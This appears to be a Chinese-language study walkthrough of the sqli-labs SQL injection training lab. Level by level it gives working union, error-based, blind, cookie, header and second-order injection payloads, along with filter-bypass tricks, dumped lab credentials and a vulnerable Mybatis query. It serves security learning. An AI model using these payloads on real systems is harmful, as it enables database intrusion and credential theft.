# poc  闭合
/Less-28/?id=1')%09UNion%a0Select%091,2,('N

# 出数据 poc
/Less-28/?id=0')%09UNion%a0Select%091,version(),('3
	Your Login name:5.7.30-0ubuntu0.18.04.1
	Your Password:3

```

# Less-27a Trick with SELECT & UNION
**union based injection**

```markdown
/Less-27a/?id=0"uNIon%A0seleCt%A01,2,"3
```



**blooean injection**

```markdown
# /Less-27a/?id=1" and"1"="1
1

# /Less-27a/?id=1" and"1"="0
0
```

# Less-27 Trick with SELECT & UNION
过滤了`SELECT、UNION`，但是采用报错注入完全可行

```markdown
# id=1'or(extractvalue(1,concat(0x5c, (VERSION()),'~')))='1'and'1a
 XPATH syntax error: '\5.7.30-0ubuntu0.18.04.1~' 
```

试着用`UNION`联合注入，需要bypass**空格及注释的过滤，**采用大小写绕过关键字过滤，`%a0`绕过空格过滤

**猜列数**

```markdown
# 3列时，正常显示
## /Less-27/?id=0'uNIon%A0selECt%A01,2,'3
	 Hint: Your Input is Filtered with following result: 0'uNIon�selECt�1,2,'3 

# 4列时，报错
## /Less-27/?id=0'uNIon%A0selECt%A01,2,3,'N
The used SELECT statements have a different number of columns
	Hint: Your Input is Filtered with following result: 0'uNIon�selECt�1,version(),'3
```

**联合注入**

```markdown
# 关键词大小写 + %a0 + where闭合单引号 + group_concat带出所有数据
## /Less-27/?id=0%27uNIon%A0selECt%A01,group_concat(username),group_concat(password)%a0from%a0users%a0where%a0%271%27^%270

Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 
```

ref

+ [SQL注入靶场sqli-labs 1-65关全部通关教程 - 卿先生 - 博客园](https://www.cnblogs.com/-qing-/p/11610385.html#_lab2_0_16)
+ [注入绕过技巧](https://www.jianshu.com/p/48a935b123ce)

# Less-26a Trick with comments
盲注

```markdown
# /Less-26a/?id=0' || '0
无结果

# /Less-26a/?id=0' || '1
有结果
```

# Less-26 Trick with comments
过滤了空格、注释、`and`和`or`的处理

1. **空格、注释被过滤的绕过：**用`%a0`（测试失败。。。），也可以使用括号`()`，例如`id=1'and('b')=('b')and'1`。在要使用空格的场合（如`and`后面遇到字母）。需要注意的是：逻辑运算符不能被括号包裹
2. **and、or被过滤****的绕过**：双写，即`AandND oorr`；或用其它双目运算符，如`&&    ||    |    ^    >    <` 等

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592619793391-8b3b86d7-92f9-46e3-bd08-7d45ecf50d27.png)

```markdown
/Less-26/?id=1'oorr(extractvalue(1,concat(0x5c, (VERSION()),'~')))='1'anandd'1a
```

# Less-25a Trick with OR & AND Blind
数字型的盲注，过滤了`and`和`or`，可用`anandd`  `oorr`双写绕过

```markdown
# poc
/Less-25a/?id=1 anandd if(lengh(version())=23,sleep(5),1)
（爆破）确定长度为23


# 简单exp, 出结果
/Less-25a/?id=1+anandd+if('a'=substring(version(),1,1),1,0)

```

利用`1 and [CASE]`中，`[CASE]`为真、假时，回显的不同来跑盲注

用burp的intruder来操作，配置如图

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592799238921-29e647c8-d269-4770-909d-8777b2eb895e.png)![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592799257427-4b232c18-94ac-42b9-a502-792d2a52b98d.png)

```markdown
# 用于fuzz的payload
0123456789.-_qwertyuiopasdfghjklzxcvbnm
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592799297552-8f1c18ec-f0a7-4946-bc6c-fb7d72421413.png)

最后指定关键字即可，

结果是一位一位出来的，如图

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592799419550-d301cc6b-ec91-4d4e-bdfd-477bd0d2529c.png)

但这种方法的时间复杂度太高了，可以利用二分法来降低至`O(log``_n_``)`, 因为2^8=128，可以涵盖完所有的ASCII码，即比较八次即可确定一位数据。我会在后面给出盲注二分法的脚本。

# Less-25 Trick with OR & AND
过滤了`or`跟`and`，绕过倒是好绕过，双目运算符都行，例如`||  &&`

```markdown
id=1' ^ extractvalue(0x20,concat(0x7c,user(),0x7c)) ^'
```

不过由于or不能用，所以没法用`inf``**or**``mation_schema`来获得表名和列名。

想用16进制，发现【不能绕过】，长姿势了

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592577166667-b4df2a13-8b23-45f0-9760-cf3702c0bff7.png)

下面介绍不用information_schema也能得到表名、列名的方式

1. 先得到版本，

```markdown
# /Less-25/index.php?id=1' || extractvalue(0x20,concat(0x7c,(version()),0x7c)) ||'
XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|' 
```

2. 再尝试得到表名

```markdown
# /Less-25/index.php?id=1' || extractvalue(0x20,concat(0x7c,(select group_concat(0x20,table_name) from mysql.innodb_table_stats where database_name = database() limit 2),0x7c)) ||'
 XPATH syntax error: '| emails, referers, uagents, use' 
```



## 无列名注入
> 高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。
>

MySQL 5.6 及以上版本存在`innodb_index_stats`，`innodb_table_stats`两张表，其中包含新建立的库和表

```sql
select table_name from mysql.innodb_table_stats where database_name = database();
select table_name from mysql.innodb_index_stats where database_name = database();
```

ref

+ [https://www.cnblogs.com/20175211lyz/p/12358725.html](https://www.cnblogs.com/20175211lyz/p/12358725.html)
+ [CTF|mysql之无列名注入](https://zhuanlan.zhihu.com/p/98206699)
+ [[SWPU2019]Web1(二次注入,无列名注入,bypass information_schema) ](https://www.cnblogs.com/hello-there/p/12918265.html)

# Less-24 - Second Degree Injections
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592582913236-d9f8a9ed-33a3-4ab6-866d-52945e92571b.png)

二次注入，在登录时注册带有payload的用户名，改密码时取用的值未进行转义导致注入。

`/Less-24/pass_change.php`

```makefile
$username= $_SESSION["username"];
...
if($pass==$re_pass)
{	
	$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
    ...
}
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592569574436-f326b619-d219-4214-9019-e46b8596b875.png)更改密码后![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592569847089-af2729c4-2589-46ae-b9de-539c4f564494.png)

`admin`的密码已经被成功更改

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592569763758-fecb935d-098c-4381-955d-ab71ebff6f50.png)

网上大部分教程，都是到更改`admin`的密码就结束了。那么我尝试了对这个注入点进行报错注入，j即注册名字为如下payload的用户

```markdown
' and extractvalue(0x20,concat(0x7c,version(),0x7c)) and '
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592570103001-f13eaf77-f49e-4e86-932a-11b3e275ab7c.png)

发现它提示用户名太长了，搜索一番之后解决方案不易实现（都需要改php.ini并重启），写了以下二次注入脚本

```markdown

```



ref:

+ [ 成功解决data too long for column 'name' at row 1](https://blog.csdn.net/zhaopeipei1985/article/details/2633997)



# Less-23 **Error Based- no comments**
把注释替换掉了，那么就要想其它办法闭合。这里采用运算符`>`来连接payload，实际上`-    *    |    %`都可以作为双目运算符连接. 单目运算符的话，可以用`!    ^`等

```markdown
id=1' and ''>(extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ) or '
//无论单双目运算符，只要闭合语句即可
id=1' and ~(extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ) or '
```



# Less-22 Cookie Injection- Error Based- Double Quotes - string
cookie注入，双引号，直接用burp的Pitchfork模式来fuzzing，第一个位置是base64编码的payload，第二个是占位用的原始payload，可以看到双引号` " `有报错

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592458022007-a5ad99a4-0790-4adc-85ec-c1c2593a24c3.png)

```markdown
admin"and extractvalue(0x20,concat(0x7c7c,version(),0x7c7c))-- -
# 同样的，base64编码
YWRtaW4iYW5kIGV4dHJhY3R2YWx1ZSgweDIwLGNvbmNhdCgweDdjN2MsdmVyc2lvbigpLDB4N2M3YykpLS0gLQ==
```



# Less-21 Cookie Injection- Error Based- complex - string
cookie注入，只不过需要先base64编码



```http
	payload如下
admin'and extractvalue(0x20, concat(0x7c,version(),0x7c)) and '
	base64编码如下
YWRtaW4nYW5kIGV4dHJhY3R2YWx1ZSgweDIwLCBjb25jYXQoMHg3Yyx2ZXJzaW9uKCksMHg3YykpIGFuZCAn
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592408875594-64d93452-df5f-4f9f-b37b-3e708cd63b35.png)

# Less-20 Cookie Injection- Error Based- string
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592407109925-acfdbfdf-16bb-49a5-92d7-29a0d16cc7aa.png)

cookie注入，在登录之后，更改cookie，加单引号发现报错，猜测原始语句，构造如下payload即可

```http
Cookie: uname=admin'and extractvalue(0x20,concat(0x7c,version())) -- -
```





# Less-19 Header Injection- Referer- Error Based- string
到这里才摸到一点门道，一样的报错注入，`'and [payload] and'`的形式，用`0x7c`（也就是`|`）把查询内容`version()`字符串化，报错输出

```http
Referer: 123321'and extractvalue(0x20, concat(0x7c,version(),0x7c)) and '
```

结果如下

```http
XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'
```

# Less-18 Header Injection- Error Based- string
通过阅读源码，知道了语句结构

```http
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```

但为啥这样闭合我是真没想明白。。。。

```http
User-Agent: 'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '
```

【后续】想明白了，最终的语句即`'``'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '``'` ，中间就是我们拼接的payload，实际上是参与**与运算**得到的一个值，这

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592377145499-e2f1f2da-8777-41f8-897d-06e0549e5c46.png)

最后用如下语句完成了报错注入,

+ `7c `  ->  `| `
+ `3a `  ->  `: `

```markdown
'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '
```

# Less-17 Update Query- Error based - String
测试当用户名是`admin`时，密码框有报错注入

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592143252481-0148265c-d490-4009-bf3d-6310ac4de355.png)



# Less-16- Blind- Time Based- Double quotes- String
确定闭合符号，

子查询确定注入符号

```javascript
admin")or (select 1 from (select sleep(2) )x)-- -1
```

延时2秒

# Less-15- Blind- Boolian Based- String
加单双引号都不报错了，知道用户名是`admin`的情况下，只能通过是否成功登录来确定闭合符号

闭合符号是单引号

```sql
admin' -- -
```

是延时盲注。



# Less-14- Double Injection- Double quotes- String
加双引号报错了，接着确定出闭合符号就是双引号`"`，下一步直接进行注入即可

没有回显的情况下，即使使用`order by`确定了有两列数据 ，但用`UNION`就只有走布尔盲注那条路，并且基于`floor`的报错注入要求表中至少要有三项以上的数据，显然是行不通的。

把前面的`payload`里的闭合符号改改，快速通过

```sql
admin" and extractvalue(1, concat(0x5c,(select table_name from information_schema.tables limit 1),'~'));-- -
```

# Less-13- Double Injection- String- with twist
加单引号报错，闭合符号是`')`，用`admin')-- -`，没想到是万能密码直接成功登录了

同样的用`sqlmap`冲，即可。但是我还是选择手工搞报错注入，一定要把末尾闭合，才能得到报错注入出来的信息！

```sql
# 爆版本号
admin') and extractvalue(1,concat("~",version(),"~"))-- -
...
```



# Less-12- Error Based- Double quotes- String
确定闭合符号的时候遇到点问题，一开始用`admin"`的时候报错，但是万能密码却尝试失败`admin"or""="`, 后来使用注释来确定闭合符号`admin"-- -`、`admin")-- -`成功闭合

```sql
# 万能密码
admin")or""=("

# 注释绕过
因为最后有个 LIMIT 1，1  就不太能用username=/*&password=*/的方式来绕过密码
```

直接跑`sqlmap -r` 即可



# Less-11- Error Based- String
## 闭合
加引号，报错。确定用单引号闭合`admin' -- -`, 报错注入+`UNION`联合注入

```markdown

# 万能密码
admin' or ''='
admin' and extractvalue(1,concat("~",(version()),"~"))-- -
```



---

# Less-10：Blind- Time based- Double Quotes- String
```sql
id=1" and sleep(2)='1' -- -		有延时
```



# Less-9：Blind- Time based- Single Quotes- String
无论是添加引号还是注释，都完全不报错。

```sql
id=2' AND '1'=SLEEP(1)-- -		有延时
id=2' AND '1'=SLEEP(5)-- -		有延时
```



# Less-8：Blind- Boolian- Single Quotes- String
有状态回显，闭合符号是单引号`'` ，

根据是否回显` You are in...........`来判断.

得出结论，盲注可分为两类：布尔盲注+基于时间的盲注。

因为没有t/f的回显，即从响应上看不出任何差异（响应包括：响应大小/状态码/页内文字）

# Less-7：Dump into Outfile
无数据和错误回显，依然是先确定闭合。

```sql
id=1' -- -		报错
id=1') -- -		报错
id=1')) -- -		正常

```

布尔盲注+延时注入，sqlmap一把梭了

# Less-6：Double Query- Double Quotes- String
闭合变成单引号，其余于Less 5一样

```sql
id=1" and updatexml("1",concat("~",version(),"~"),"1")-- -
# 单行
id=1" and updatexml("1",concat("~",(select group_concat(0x20,(select schema_name from information_schema.schemata limit 1,1))),"~"),"1")-- -
# 多行
id=1" and updatexml("1",concat("~",((select group_concat(column_name) from information_schema.columns where table_name='emails')),"~"),"1")-- -
```





# Less-5：Double Query- Single Quotes- String
无数据回显的注入点

## 闭合
```sql
id=1"		正常
id=1'		报错
id=1'-- -		正常
```

闭合字符串是单引号`'`，猜测后端语句是`select id from test where id='$id';`

因为没有回显位，无法使用联合注入，但可用union引入floor的报错注入

## 报错注入
```sql

id=1' AND EXTRACTVALUE(1,concat("~",(select group_concat(table_name) from information_schema.tables where table_schema='security'),"~"))-- -
id=1' AND EXTRACTVALUE(1,concat("~",(select group_concat(column_name) from information_schema.columns where table_name='emails'),"~"))-- -
id=1' AND EXTRACTVALUE(1,concat("~",(select group_concat(schema_name) from information_schema.schemata),"~"))-- 

# floor
id=1' UNION SELECT null,null,null from (SELECT COUNT(*),concat(floor(rand(0)*2),"~",version())x from information_schema.tables group by x )x-- -
id=1' UNION SELECT null,null,null from (SELECT COUNT(*),concat(floor(rand(0)*2),"~",(select group_concat(0x20,table_name) from information_schema.tables ))x from information_schema.tables group by x )x-- -
```



# Less-4：Error Based- DoubleQuotes String
## 闭合


```sql
id=1'	   正常
id=1"	   报错
id=1" -- -		报错
id=1") -- -   正常
```

闭合字符串是`")`合理猜测原语句结构为`select id from test where id=("$id");`

## payload


```sql
# 联合
id=-2") union select 1,2,group_concat(schema_name,0x20) from information_schema.schemata -- -

# 报错
id=-1")+AND+updatexml(1,concat("~",(select+version()),'~'),1)-- -

```



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586505197604-40c983d2-34cc-4005-a2ec-9d61d6653b24.png)

# less-3：Error Based- String (with Twist)
## 确定闭合符号啊！
```sql
id=1'		报错
id=1' -- -  报错
id=1') -- -  正常

```

确定闭合符号是`')`，就可以按照之前的步骤来注入了

## 联合注
```sql

id=-2') union select 1,2,group_concat(schema_name,0x20) from information_schema.schemata -- -
id=-2') union select 1,2,group_concat(table_name,0x20) from information_schema.tables where table_schema='security' -- -
id=-2') union select 1,2,group_concat(column_name,0x20) from information_schema.columns where table_name='users' -- -

```



## 报错注
 **有回显长度的限制**

如果不用concat把它字符串化，会导致结果回显失败

```sql
id=-1')+AND+updatexml(1,concat("~",(select+version()),'~'),1)-- -

id=-1')+AND+extractvalue(1,concat("~",(select+version()),'~'))-- -

id=-1') and extractvalue(1, (SELECT+group_concat((select table_name from information_schema.tables limit 4,1),0x20)+FROM+information_schema.columns))-- -

id=-1') union select 1,2,3 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x )a-- -

```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586502458478-76f20c40-ccc1-4ded-8e1d-f6ea67f5fded.png)

**floor无回显限制**

从`sqlmap`提取出来的攻击向量`Vector`

```sql
1,0x7365637572697479,0x73797 '||(SELECT 0x45576d74 WHERE 1206=1206 AND (SELECT 5316 FROM(SELECT COUNT(*),CONCAT(0x71707a7871,(SELECT MID((IFNULL(CAST(table_schema AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x6d7973716c69,0x706572666f726d616e63655f736368656d61,0x7365637572697479,0x737973) LIMIT 39,1),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'3) LIMIT 39,1),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'
```

**payload**

```sql
id=-1') union select 1,2,3 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x )a-- -
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586499264221-8c1cfe72-41ce-4d39-80ef-9d0c35fb8024.png)



# less-2：Error Based- Intiger
## 联合注
`order by `定列数：3列，回显2，3位置，直接用group_concat尝试取出所有数据



```sql
id=0  UNION SELECT 1,2,group_concat( column_name,0x20) from information_schema.columns
```



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586420151258-f3369495-a134-49e3-b852-5c83003e7679.png)

## 报错注
```sql
http://sqli.zuoxueba.org/Less-2/?id=1 and 
(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) 
from information_schema.tables limit 0,1),floor(rand(0)*2))x 
from information_schema.tables group by x)a)
```

整型注入，不需要加单引号

## 盲注
```sql
# 测试
1+and+case+when+(1=1)+then+sleep(1)+else+1+end

# 出数据
1+and+case+when+(left((select+version()),1)='5')+then+sleep(1)+else+1+end
	- left(str,length)
  - substr(str,start,[length])
  	+ start 开始位置，默认是从1开始
    + length是返回字符串的长度，不可为负数
    

```





# less-1：Error Based- String
## 联合注
之所以`id=1`时，不出数据，是因为源码中31行的`**mysql_fetch_array()**`函数只取1行，

> **mysql_fetch_array**() 函数从结果集中取得一行作为关联数组
>

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586286240874-ee453d74-bf47-4b77-8b5e-6ecdeeaa5cb6.png)

假如直接执行`id=1`的话，是有两行结果的，我们想执行的查询在第2行，所以就拿不到结果。

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586286614284-2d46cd91-aa37-4933-bd80-f0b0370db1a3.png)

因此，才需要让`id`等于一个不存在的值（如-1），使`mysql`只返回我们想要的查询结果.



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586286830896-64bed519-3b4e-4aab-9659-1652de1e3b94.png)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586286876950-da58195a-4a74-4bb7-b37c-3c10fcd05889.png)

此外，`1,2,3-- #`中，`-- #`的作用是注释掉后面的语句，`--`与`#`之间必须有一个空格，否则会报错。更正为如下

> 注意：一定要在注释符号后加空格，或者URL编码后的空格（%20），否则注释符号不会产生作用。#号换成其它符号也可
>

## 报错注
参考资料

+ [十种MySQL报错注入](https://www.cnblogs.com/wocalieshenmegui/p/5917967.html)

可用的payload主要有以下几类

### XPATH语法错误
报错信息是有长度限制的，在`mysql/my_error.c`中可以看到：

```plain
/* Max length of a error message. Should be
kept in sync with MYSQL_ERRMSG_SIZE. */
#define ERRMSGSIZE (512)
```

#### UpdateXml(1,(QUERY),1)
> UPDATEXML (XML_document, XPath_string, new_value);
>
> 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
>
> 第二个参数：XPath_string **(要求是Xpath格式的字符串) **，如果不了解Xpath语法，可以在网上查找教程。
>
> 第三个参数：new_value，String格式，替换查找到的符合条件的数据
>
> 作用：改变文档中符合条件的节点的值
>

```sql
1 and pdatexml(1,(QUERY),1)
1 and 1=(updatexml(1,(QUERY),1))  //updatexml左右的括号可要可不要

id=1' and '1'=(updatexml('2',concat('~',(select @@basedir),'~'),'2'))-- 1
id=0' and updatexml(2,concat('~',(select version()),'~'),2)-- 1

```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586288624828-52c2c0b3-992c-43a4-917e-cdbaad5d7bc6.png)



#### ExtractValue(1,(QUERY))
> `[ExtractValue(xml_frag, xpath_expr)](https://yq.aliyun.com/go/articleRenderRedirect?spm=a2c4e.11153940.0.0.34f261feypnf9U&url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fxml-functions.html%23function_extractvalue)`
>
> `[ExtractValue()](https://yq.aliyun.com/go/articleRenderRedirect?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fxml-functions.html%23function_extractvalue)`接受两个字符串参数，一个XML标记片段 _xml_frag_和一个XPath表达式 _**xpath_expr**_（也称为 定位器）; 如果它存在语法错误，sql就会把错误显示出来。
>

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586354275997-58cabcfa-f20c-47e3-89c0-6fca31b64ef2.png)



```sql
id=1%27%20and%20extractvalue(1,%20concat(0x5c,%20(select%20table_name%20from%20information_schema.tables%20limit%201),%27~%27));--%20-
```



### 主键重复
#### floor
> _ 通过floor报错【没有任何字符长度限制】 需要数据表里有三条以上的数据_
>
> [https:/](https://xz.aliyun.com/t/253#toc-2)[/xz.aliyun.com/t/253#toc-2](https://xz.aliyun.com/t/253#toc-2)
>

先看一段常用的`payload`

```sql
?id=0 union select 1,2,3 from( select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x )a-- -
```

主要是由于`count(*)`、`rand()` 、 `group by `  这三个函数连用造成的**主键重复**问题

```plain
floor(x) 函数，向下取整,返回一个不大于x的值
round(x,d) 函数，根据四舍五入保留指定的小数位数，x指要处理的数，d是指保留几位小数。
rand() 函数，产生一个0-1之间的随机浮点数，若有参数x，则返回一个x对应的固定的值
```

首先，先看`floor(rand(0)*2))`，它是个开头为`0 1 1 0 1 1`的固定序列

```plain
mysql> select floor(rand(0)*2) from test;
+------------------+
| floor(rand(0)*2) |
+------------------+
|                0 |
|                1 |
|                1 |
|                0 |
|                1 |
|                1 |
+------------------+
6 rows in set (0.00 sec)
```

`group by key`是对进行数据进行分组统计，效果如下图所示。很容易看清楚，它是不允许key值重复的（也就所下图中的name列），如果重复就会报错

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586409955539-b1006041-5c09-41b9-bee0-a7f10184fa95.png)

同时`group by`它的原理是循环读取数据的每一行，将结果保存于虚拟表中。这个虚拟表读取每一行的key时会有如下的逻辑：

+ 如果**判断**key已存在于临时表中，**不插入**数据；
+ 如果**判断**key不在临时表中，则在临时表中**插入**当前行的数据

刚刚说到，`floor(rand(0)*2)`这个值不是常量，是会在` 0 1 `这两个值中间变动的，这就导致`group by`在执行**判断**与**插入**这两个操作时，标准都已经变了！~~（这一秒你以为我是0，其实下一秒我就成了1，没想到吧哈哈）~~

~~~~

此外，为何要在`payload`中用`x`和`a`来占位，实际上这是表的别名(`alias`)，等同于` as x`（下图有运行效果），在子查询中得用，不然会报这个错`Every derived table must have its own alias `

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586354642583-bf8fc31a-6698-46c5-9878-931674632223.png)![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586354668898-70056c04-f192-4b86-b4eb-72c48ddb18e1.png)



[MYSQL报错注入的一点总结 - 先知社区](https://xz.aliyun.com/t/253#toc-2)

### 大数溢出


```sql
geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()
```



> 一说在mysql>5.5.53时，则不能返回查询结果
>
> 二说在版本号为5.5.47上可以用来注入，而在5.7.17上则不行：
>
> [https://xz.aliyun.com/t/253#toc-4](https://xz.aliyun.com/t/253#toc-4)
>
> 总结：在高版本mysql上不可
>

# Tips
Mybatis注入

```xml
<select id="getByName" resultType="com.example.demo.entity.User">
  select * from user where
  name like '${'%' + name + '%'}'
  </select>
```

上面的可以注入, 使用的是



+ distinct去除重复项

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586353989124-f5a8bb4e-374d-4d36-8677-89869f68a1f0.png)

```sql
SELECT distinct concat(0x7e, (select password),0x7e) FROM users limit 1,1),0x7e),1)-- -
```

+ `group_concat` 合并多行结果在一行显示, `group_concat`后可以不跟`group` by，但里面必须跟列名，而不能跟子查询
+  报错注入里，必须要用`concat("~", [QUERY] , "~")`将其左边、右边字符串化，否则会导致回显不全

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586502391261-1de189fb-efe1-442f-a013-477a60f3ffd4.png)![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586502428533-fc953746-ff26-4b14-b545-37e70f914275.png)

+ `-- -`中在浏览器是空格，在burp里是加号`+`

# 部署说明
+ [https://github.com/alecshan/sqli-labs-for-docker](https://github.com/alecshan/sqli-labs-for-docker)

